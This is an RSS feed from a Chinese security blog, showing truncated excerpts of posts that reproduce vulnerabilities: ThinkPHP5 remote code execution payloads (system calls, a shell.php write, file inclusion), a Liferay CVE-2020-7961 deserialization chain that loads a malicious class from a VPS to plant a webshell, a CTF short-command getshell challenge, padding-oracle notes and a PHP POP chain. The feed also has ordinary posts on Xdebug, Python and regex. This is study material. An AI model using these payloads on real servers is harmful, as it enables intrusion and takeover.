<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>note on wh1sper</title>
    <link>https://anthem-whisper.github.io/categories/note/</link>
    <description>Recent content in note on wh1sper</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <lastBuildDate>Fri, 12 Mar 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/categories/note/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>thinkphp5代码审计</title>
      <link>https://anthem-whisper.github.io/p/thinkphp5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</link>
      <pubDate>Fri, 12 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/thinkphp5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</guid>
      <description>本篇博文会复现大多数tp5的漏洞，持续更新
审计环境搭建 安装thinkphp 推荐使用composer，版本切换很方便
composer create-project --prefer-dist topthink/think=5.0.10 tp5.0.10 将 composer.json 文件的 require 字段设置成如下：
&amp;quot;require&amp;quot;: { &amp;quot;php&amp;quot;: &amp;quot;&amp;gt;=5.4.0&amp;quot;, &amp;quot;topthink/framework&amp;quot;: &amp;quot;5.0.10&amp;quot; }, 然后执行 composer update
PhpStorm+Xdebug调试环境 可以看我另外一篇文章：Debian下PHP Xdebug调试环境搭建
另外VSCode+Xdebug也是一个不错且方便的选择
框架基本流程 框架基本流程网上都讲的很清楚，我这里就不搬运了
这两篇文章讲的很不错：
https://paper.seebug.org/888/#_4
https://xz.aliyun.com/t/8143
RCE-类名解析导致任意类方法调用  ThinkPHP版本：5.0.7&amp;lt;=5.0.x&amp;lt;=5.0.22 、5.1.0&amp;lt;=5.1.x&amp;lt;=5.1.30
参考：
https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md
https://paper.seebug.org/888/#poc
https://xz.aliyun.com/t/3570
 概述 本次漏洞存在于 ThinkPHP 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 远程代码执行漏洞 的产生。漏洞影响版本： 5.0.7&amp;lt;=ThinkPHP5&amp;lt;=5.0.22 、5.1.0&amp;lt;=ThinkPHP&amp;lt;=5.1.30。不同版本 payload 需稍作调整：
5.1.x ：
?s=index/\think\Request/input&amp;amp;filter[]=system&amp;amp;data=pwd ?s=index/\think\view\driver\Php/display&amp;amp;content=&amp;lt;?php phpinfo();?&amp;gt; ?s=index/\think\template\driver\file/write&amp;amp;cacheFile=shell.php&amp;amp;content=&amp;lt;?php phpinfo();?&amp;gt; ?s=index/\think\Container/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id ?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id 5.0.x ：
?s=index/think\config/get&amp;amp;name=database.username # 获取配置信息 ?s=index/\think\Lang/load&amp;amp;file=../../test.jpg # 包含任意文件 ?s=index/\think\Config/load&amp;amp;file=../../t.php # 包含任意.</description>
    </item>
    
    <item>
      <title>Debian下PHP Xdebug调试环境搭建</title>
      <link>https://anthem-whisper.github.io/p/debian%E4%B8%8Bphp-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</link>
      <pubDate>Fri, 19 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/debian%E4%B8%8Bphp-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</guid>
      <description>Debian下PHP Xdebug调试环境搭建  本文永久链接：http://wh1sper.com/debian%e4%b8%8bphp-xdebug%e8%b0%83%e8%af%95%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba/
 前言 Xdebug是PHP的扩展，用于协助调试和开发。
 它包含一个用于IDE的调试器 它升级了PHP的var_dump()函数 它为通知，警告，错误和异常添加了堆栈跟踪 它具有记录每个函数调用和磁盘变量赋值的功能 它包含一个分析器 它提供了与PHPUnit一起使用的代码覆盖功能。  本地跟代码必备的工具。 但不推荐在生产环境中使用xdebug，因为他太重了。
预置环境   OS: Kali GNU/Linux Rolling x86_64
  Kernel: 5.7.0-kali1-amd64
  PHP version: 7.4.14
  Server API: FPM/FastCGI
  nginx version: nginx/1.18.0
  PhpStorm version: 2020.3
  下载安装Xdebug 访问https://xdebug.org/wizard
在web服务器中放入phpinfo，（注意最好是使用web服务，如果是本地php脚本的话php.ini可能会不一样）
访问之后将整个页面源码Ctrl+A Ctrl+C复制到框里面： 分析之后会自动给你最合适的版本，并且告诉你后续安装步骤。
下载给出的.tar.tgz文件
1.安装PHP拓展
apt-get install php-dev autoconf automake2.解压
tar -xvzf xdebug-3.0.2.tgzcd xdebug-3.0.23.</description>
    </item>
    
    <item>
      <title>python面向对象基础学习</title>
      <link>https://anthem-whisper.github.io/p/python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</link>
      <pubDate>Thu, 09 Jul 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</guid>
      <description>说了暑假学开发，绝对不咕咕咕（0%）
 面向过程 假如你拥有了一个做饭洗碗的任务，你准备用面向过程的思想来解决它
可以看到过程非常的繁琐，你将面对所有的步骤
 面向对象 假如你现在有个对象，她拥有两个技能：
1.做饭 2.洗碗
那么你只需要面向你的对象，然后你的对象去处理其他所有过程
那如果你的对象再拥有两个对象：
1.炒菜机 2.洗碗机
那么她只需要每次都做三个动作，不必一次面向所有步骤
 很妙！对不对？
你只需要对你的对象说需要做什么，然后你的对象就会帮你做好所有的事情，你既看不到具体的过程，你也不需要知道具体的过程
你的对象也不需要知道具体的炒菜或者洗碗的步骤，她只需对洗碗机或者炒菜机说需要做什么，洗碗机或者炒菜机就会帮她做完所有的步骤
这个就叫做封装。
把搅拌、翻炒、监测火候封装成自动炒菜机 把倒洗洁精、刷碗、擦干水封装成自动洗碗机 再把剩下的封装成你的女朋友
 两者的对比  面向对象本身是对面向过程的封装 面向过程什么最重要？  按步骤划分 把每个任务，分解成具体的每个步骤   面向对象什么最重要？  按功能就行划分 找到对象，确定对象的属性、行为   如何从面向过程思想转化为面向对象思想？  和面向过程一样，先找到所有步骤 试图分离功能代码块 将这些功能代码块，划分到某对象中 根据对象行为，抽象出 “类”   对象和类的关系  对象-&amp;gt;抽象-&amp;gt;类-&amp;gt;实例化-&amp;gt;对象     对象和类 对象和类里面有两个东西：
 属性 方法  属性是静态的、用来描述这个类或者对象本身的变量
比如，张三这个对象，他的属性有年龄、性别、身高、体重 人这个类属性也有年龄、性别、身高、体重
张三能执行吃饭这个动作，这就是他的一个方法
现在我们来新建一个类，把他实例化为一个对象并且给他一些属性：
# python3class Person:passzhangsan = Person()#实例化为对象zhangsan.</description>
    </item>
    
    <item>
      <title>CVE-2020-7961 Liferay Portal 反序列化-复现</title>
      <link>https://anthem-whisper.github.io/p/cve-2020-7961-liferay-portal-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%A4%8D%E7%8E%B0/</link>
      <pubDate>Mon, 15 Jun 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/cve-2020-7961-liferay-portal-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%A4%8D%E7%8E%B0/</guid>
      <description>漏洞说明 Liferay是一个开源的Portal产品,提供对多个独立系统的内容集成,为企业信息、流程等的整合提供了一套完整的解决方案,和其他商业产品相比,Liferay有着很多优良的特性,而且免费,在全球都有较多用户。该漏洞是个反序列化导致的RCE，通过未授权访问其api传递json数据进行反序列化，危害较高
影响范围 Liferay Portal 6.1、6.2、7.0、7.1、7.2
环境搭建 漏洞环境：
windows 10
jre1.8.0_221
jdk1.8.0_221
tomcat集成包：https://github.com/liferay/liferay-portal/releases/tag/7.2.0-ga1 （我用的liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761.tar.gz）
启动环境 E:\tmp\liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761\liferay-portal-7.2.0-ga1\tomcat-9.0.17\bin&amp;gt; .\catalina.bat run访问 http://localhost:8080/ 全部默认配置就可以
漏洞利用 思路：构造恶意class文件-&amp;gt;构造序列化-&amp;gt;反序列化-&amp;gt;加载VPS上面恶意evil.class文件-&amp;gt;实现下载webshell
构造恶意class文件 在VPS上面创建 LifExp.java（该写法为目标是Windows，运行计算器）-&amp;gt;编译class文件
public class LifExp { static { try { String[] cmd = {&amp;quot;cmd.exe&amp;quot;, &amp;quot;/c&amp;quot;, &amp;quot;calc.exe&amp;quot;};//命令执行java.lang.Runtime.getRuntime().exec(cmd).waitFor(); } catch ( Exception e ) { e.printStackTrace(); } } }使用 javac .\LifExp.java 生成class文件
在当前目录使用 python -m SimpleHTTPServer 8000 监听8000端口启动一个wbe服务
构造序列化 使用 marshalsec-0.0.3-SNAPSHOT-all.jar 文件进行序列化：
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.</description>
    </item>
    
    <item>
      <title>绕过4-5个字符限制getshell</title>
      <link>https://anthem-whisper.github.io/p/%E7%BB%95%E8%BF%874-5%E4%B8%AA%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6getshell/</link>
      <pubDate>Tue, 02 Jun 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/%E7%BB%95%E8%BF%874-5%E4%B8%AA%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6getshell/</guid>
      <description>这个东西起源于HITCON CTF 2017的一道题，高校战疫Hack Me也曾经出现过，最近突然做到了来说一下
参考：https://www.anquanke.com/post/id/87203
 源码 五字版本
&amp;lt;?php$sandbox = &#39;/www/sandbox/&#39; . md5(&amp;quot;orange&amp;quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);@mkdir($sandbox);@chdir($sandbox);if (isset($_GET[&#39;cmd&#39;]) &amp;amp;&amp;amp; strlen($_GET[&#39;cmd&#39;]) &amp;lt;= 5) {@exec($_GET[&#39;cmd&#39;]);} else if (isset($_GET[&#39;reset&#39;])) {@exec(&#39;/bin/rm -rf &#39; . $sandbox);}highlight_file(__FILE__);四字版本：
&amp;lt;?php$sandbox = &#39;/www/sandbox/&#39; . md5(&amp;quot;orange&amp;quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);@mkdir($sandbox);@chdir($sandbox);if (isset($_GET[&#39;cmd&#39;]) &amp;amp;&amp;amp; strlen($_GET[&#39;cmd&#39;]) &amp;lt;= 4) {@exec($_GET[&#39;cmd&#39;]);} else if (isset($_GET[&#39;reset&#39;])) {@exec(&#39;/bin/rm -rf &#39; . $sandbox);}highlight_file(__FILE__);预备知识 在cmd长度小于5（4）个字符的时候用 exec 函数执行系统命令，不过 exec 函数是默认没有回显的，这里我们就只能盲打。</description>
    </item>
    
    <item>
      <title>Padding Oracle Attack&amp;CBC字节翻转攻击</title>
      <link>https://anthem-whisper.github.io/p/padding-oracle-attackcbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</link>
      <pubDate>Tue, 21 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/padding-oracle-attackcbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</guid>
      <description>前言 在西工大举办的NPUCTF2020上面做到一道webcrypto的题，以前从来没接触过密码安全方向，这次正好学一下入个门
正文 参考
Padding Oracle Attack：
《白帽子讲web安全》P239
&amp;raquo;一叶飘零师傅
CBC翻转攻击：
&amp;raquo;某师傅
&amp;raquo;某某师傅
先来讲一讲CBC模式加密原理：
 首先将明文（Plaintext）分组(常见的以16或8字节为一组)，位数不足的使用特殊字符填充。 生成一个随机的初始化向量(IV)和一个密钥。 将IV和第一组明文异或（xor运算）。 用密钥对3中xor后产生的密文加密。 用4中产生的密文对第二组明文进行xor操作。 用密钥对5中产生的密文加密。 重复4-7，到最后一组明文。 将IV和加密后的密文拼接在一起，得到最终的密文  解密过程：
 先从密文中取出IV，然后对剩下的密文分组（16或8字节为一组） 使用秘钥解密第一组密文，将解密结果与IV做异或运算，得到明文1 然后使用秘钥解第二组密文，将解密的结果与上一组密文进行异或运算，得出明文2 重复2-3，直至所有密文解密完毕  以上就是CBC模式的加密解密过程，接下来讲两种手段：
Padding Oracle Attack 直译为 “填充Oracle攻击” ，这里主要关注一下解密过程：
密文cipher首先进行一系列处理，如图中的Block Cipher Decryption 我们将处理后的值称为 middle 中间值 然后 middle 与我们输入的iv进行异或操作 得到的即为明文 但这里有一个规则叫做Padding填充： 因为加密是按照16位一组分组进行的 而如果不足16位，就需要进行填充
有几个空，就要填充几个“几”
比如明文为admin，那么需要填充的就是 admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b （11个\x0b）
如果我们输入一个错误的iv，依旧是可以解密的，但是 middle 和我们输入的iv经过异或后得到的填充值可能出现错误
比如本来应该是 admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b 而我们错误的得到 admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x3b\x2c
这样解密程序往往会抛出异常(Padding Error)
应用在web里的时候，往往是302或是500报错 而正常解密的时候是200 所以这时，我们可以根据服务器的反应来判断我们输入的iv
看例子：
我们假设middle中间值为：
0x39 0x73 0x23 0x22 0x07 0x6a 0x26 0x3d正确的解密iv应该为</description>
    </item>
    
    <item>
      <title>由MRCTF2020学习反序列化POP链</title>
      <link>https://anthem-whisper.github.io/p/%E7%94%B1mrctf2020%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/</link>
      <pubDate>Sun, 29 Mar 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/%E7%94%B1mrctf2020%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/</guid>
      <description>复现地址：BUUOJ
打开题目即送源码：MRCTF_ezpop
先说PHP的一些魔术方法：
__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问（或不存在）的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当尝试将对象调用为函数时触发有了这些知识后，我们再来分析源码；
Welcome to index.php&amp;lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier {protected $var;public function append($value){include($value);}public function __invoke(){$this-&amp;gt;append($this-&amp;gt;var);}}class Show{public $source;public $str;public function __construct($file=&#39;index.php&#39;){$this-&amp;gt;source = $file;echo &#39;Welcome to &#39;.</description>
    </item>
    
    <item>
      <title>正则表达式学习笔记</title>
      <link>https://anthem-whisper.github.io/p/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Mon, 27 Jan 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
      <description>转自：https://www.cnblogs.com/zery/p/3438845.html
教程：https://www.runoob.com/regexp/regexp-tutorial.html
一 、前言 　对于正则表达式，相信很多人都知道，但是很多人的第一感觉就是难学，因为看第一眼时，觉得完全没有规律可寻，而且全是一堆各种各样的特殊符号，完全不知所云。
其实只是对正则不了解而以，了解了你就会发现，原来就这样啊正则所用的相关字符其实不多，也不难记，更不难懂，唯一难的就是组合起来之后，可读性比较差，而且不容易理解，本文旨在让大家对正则有一个基本的了解，能看得懂简单的正则表达式，写得出简单的正则表达式，用以满足日常开发中的需求即可。
0\d{2}-\d{8}|0\d{3}-\d{7} 先来一段正则，如果你对正则不了解，是不是完全不知道这一串字符是什么意思？这不要紧文章会详细解释每个字符的含义的。
1.1 什么是正则表达式
正则表达式是一种特殊的字符串模式，用于匹配一组字符串，就好比用模具做产品，而正则就是这个模具，定义一种规则去匹配符合规则的字符。
1.2 常用的正则匹配工具
在线匹配工具：
　1 http://www.regexpal.com/
2 http://rubular.com/
二 、正则字符简单介绍 2.1 元字符介绍
&amp;quot;^&amp;quot; ：^会匹配行或者字符串的起始位置，有时还会匹配整个文档的起始位置。
&amp;quot;$&amp;quot; ：$会匹配行或字符串的结尾
如图
​ 而且被匹配的字符必须是以This开头有空格也不行，必须以Regex结尾，也不能有空格与其它字符
&amp;quot;\b&amp;quot; :不会消耗任何字符只匹配一个位置，常用于匹配单词边界 如 我想从字符串中&amp;quot;This is Regex&amp;quot;匹配单独的单词 &amp;ldquo;is&amp;rdquo; 正则就要写成 &amp;ldquo;\bis\b&amp;rdquo;
　\b 不会匹配is 两边的字符，但它会识别is 两边是否为单词的边界
&amp;quot;\d&amp;quot;: 匹配数字，
　例如要匹配一个固定格式的电话号码以0开头前4位后7位，如0737-5686123 正则:^0\d\d\d-\d\d\d\d\d\d\d$ 这里只是为了介绍&amp;quot;\d&amp;quot;字符，实际上有更好的写法会在 下面介绍。
&amp;quot;\w&amp;quot;：匹配字母，数字，下划线.
　例如我要匹配&amp;quot;a2345BCD__TTz&amp;quot; 正则：&amp;quot;\w+&amp;quot; 这里的&amp;quot;+&amp;ldquo;字符为一个量词指重复的次数，稍后会详细介绍。
&amp;quot;\s&amp;rdquo;：匹配空格
　例如字符 &amp;ldquo;a b c&amp;rdquo; 正则：&amp;quot;\w\s\w\s\w&amp;quot; 一个字符后跟一个空格，如有字符间有多个空格直接把&amp;quot;\s&amp;quot; 写成 &amp;ldquo;\s+&amp;rdquo; 让空格重复
&amp;quot;.&amp;quot;：匹配除了换行符以外的任何字符
　这个算是&amp;quot;\w&amp;quot;的加强版了&amp;quot;\w&amp;quot;不能匹配 空格 如果把字符串加上空格用&amp;quot;\w&amp;quot;就受限了，看下用 &amp;ldquo;.</description>
    </item>
    
  </channel>
</rss>
